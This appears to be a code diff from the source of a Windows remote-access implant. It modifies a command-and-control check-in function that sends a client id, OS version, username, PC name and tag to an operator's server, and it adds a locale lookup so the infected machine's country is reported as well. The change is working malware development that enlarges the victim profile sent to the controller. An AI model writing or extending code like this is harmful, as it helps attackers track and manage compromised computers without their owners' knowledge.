@@ -321,20 +321,25 @@ int protocol_checkin(CryptoContext *crypto, SystemInfo *info) {
   const char *hname = info->hostname ? info->hostname : "";
   const char *itag = info->tag ? info->tag : "";
 
+  // 获取系统地区（国家名称，英文）
+  char country_buf[128] = "Unknown";
+  GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SENGCOUNTRY, country_buf,
+                 sizeof(country_buf));
+
   size_t inner_size = 256 + strlen(g_client_id) + strlen(VERSION) +
                       strlen(os_ver) + strlen(uname) + strlen(hname) +
-                      strlen(itag);
+                      strlen(itag) + strlen(country_buf);
   char *inner_payload = safe_malloc(inner_size);
   snprintf(inner_payload, inner_size,
            "{\"id\":\"%s\","
            "\"version\":\"%s\","
            "\"operating_system\":\"%s\","
            "\"account_type\":\"User\","
-           "\"country\":\"Unknown\","
+           "\"country\":\"%s\","
            "\"username\":\"%s\","
            "\"pc_name\":\"%s\","
            "\"tag\":\"%s\"}",
-           g_client_id, VERSION, os_ver, uname, hname, itag);
+           g_client_id, VERSION, os_ver, country_buf, uname, hname, itag);
 
   // Build C2Request format: {type, client_id, payload}
   size_t payload_size = 128 + strlen(g_client_id) + strlen(inner_payload);
